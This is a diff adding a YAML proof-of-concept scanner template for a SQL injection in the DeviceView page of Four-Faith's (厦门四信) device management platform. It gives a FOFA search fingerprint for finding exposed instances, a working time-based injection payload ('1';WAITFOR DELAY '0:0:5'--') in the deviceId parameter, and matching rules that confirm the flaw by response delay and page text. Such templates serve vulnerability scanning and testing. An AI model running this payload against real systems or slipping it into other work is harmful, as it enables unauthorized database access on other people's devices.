@@ -1,0 +1,17 @@
+id: poc-yaml-four-faith-equipment-management-platform-deviceview-sqli
+info:
+  name: 厦门四信通信科技有限公司设备管理平台 DeviceView SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 设备管理平台
+  fofa: body="/Content/images/textpwd.png"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /Device/Device/DeviceView?deviceId=1';WAITFOR+DELAY+'0:0:5'--
+  expression: status_code == 200 && contains(body,"设备分组") && contains(body,"设备编码")
+    && contains(body,"最近心跳时间") && duration > t1 && duration < t2
+transport: http
